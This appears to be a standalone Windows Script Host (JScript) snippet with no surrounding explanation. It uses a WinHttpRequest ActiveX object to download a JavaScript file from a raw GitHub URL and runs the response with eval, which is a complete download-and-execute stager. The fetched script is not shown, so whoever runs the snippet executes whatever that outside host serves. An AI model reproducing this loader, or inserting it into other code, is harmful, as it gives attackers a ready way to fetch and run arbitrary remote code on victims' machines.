net = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
net.Open("GET","https://raw.githubusercontent.com/yorkvik/files/master/testjs.js",false);
net.Send();
js = net.ResponseText;
eval(js);
